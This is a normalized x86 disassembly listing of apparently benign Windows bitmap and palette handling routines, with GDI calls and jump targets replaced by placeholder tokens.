lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_422244
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41e834
sub_422678
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_422838
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421414
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_422304
sub_4226c0
push ebx
mov ebx eax
mov eax ebx
call sub_422828
mov eax ebx
call sub_422838
mov edx ebx
mov eax ebx
call sub_422304
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4226e4
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_422764
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41cf40
mov eax ebx
call sub_422734
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_422678
xor edx edx
pop ecx
call sub_41e44c
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4227b4
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_422938
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4217dc
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_422838
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_415e9c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4228bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4228d8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_422828
mov eax ebx
call sub_422838
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_422764
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_421ea4
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_421398
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_422938
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41efcc
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_421398
push 0x0
call GetDC
call sub_41e8dc
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4229f0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41e7a4
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_422244
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_422828
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_422a74
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_415e7c
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_423128
pop esi
pop ebx
retn
sub_422a98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422b1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403450
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_422b7f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42160c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_421608
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422b86
push rw-data
call LeaveCriticalSection
retn
sub_422b98
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_423128
pop edx
pop edi
pop esi
pop ebx
retn
sub_422bc0
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026cc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_4230dd
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4230b0
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cbc
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41e7bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_416118
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402cbc
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4160a8
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41ea4c
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41ea6c
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_4160a8
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41e8dc
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42302b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41ed14
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026cc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_422f93
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4160a8
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41e8dc
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_422f67
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41efcc
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cac0
call sub_41e7bc
jmp r-xdata
xor eax eax
push ebp
push sub_422ffa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4160a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f6e
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423032
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cac0
call sub_41e7bc
jmp r-xdata
sub_422f6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_423032
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4230c7
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41efcc
mov [ ebp - 0x30 ] eax
sub_4230e4
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_422a98
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423128
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422828
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_4160a8
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_422a98
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_422bc0
call sub_41e7bc
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_423198
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_422828
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_421e40
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_423233
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_422a98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42325c
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4226e4
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_422828
mov eax esi
call sub_422938
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_422828
mov eax esi
call sub_422938
mov eax esi
call sub_4227b4
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_421e40
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_422244
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_422a98
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_422a98
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4217dc
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423394
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422838
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_422244
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4233e8
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_422838
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_422244
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423468
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_422828
mov eax ebx
call sub_422838
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4217dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4234ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422a98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4216d4
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41c670
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_423504
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a54
call sub_403aa8
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4216d4
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42353c
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_422838
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_422244
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_42358c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422838
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_422244
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4235e8
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cbc
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4227b4
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41f720
cmp [ ebp + 0x70 ] 0x0
je r-xdata
